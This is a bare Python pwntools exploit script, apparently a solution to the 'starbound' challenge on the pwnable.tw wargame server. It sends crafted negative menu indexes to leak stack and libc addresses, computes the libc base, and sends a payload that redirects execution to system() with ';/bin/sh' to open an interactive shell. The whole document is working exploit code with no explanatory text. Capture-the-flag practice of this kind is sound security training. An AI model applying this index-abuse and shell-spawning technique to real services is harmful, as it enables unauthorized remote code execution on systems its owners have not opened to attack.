from pwn import *

#p = process("./starbound")
p = remote("chall.pwnable.tw", 10202)
libc_elf = ELF("/lib/i386-linux-gnu/libc-2.23.so")

p.recvuntil("> ")
p.send("-3118")
context.log_level = 'debug'
p.recvuntil("-311")

stack = u32(p.recv(4)[0:])
p.recvuntil("> ")
p.send("-3118" + "A"*(0x78 - 5))
p.recvuntil("A"*(0x78-5))
libc = u32(p.recv(4)[0:])

print "0x%x" % stack
print "0x%x" % libc

stack_pointer = stack 
libc_base = libc -0x2e10c

print "0x%x" % stack_pointer
print "0x%x" % libc_base

one_shot = libc_base + libc_elf.symbols['system']

pay = str(-(0x08058154 - stack_pointer) / 4)
pay += "a"*(4 - len(pay)%4)
pay += p32(one_shot)*30
pay += ";/bin/sh"
p.recvuntil("> ")
p.send(pay)

p.interactive()
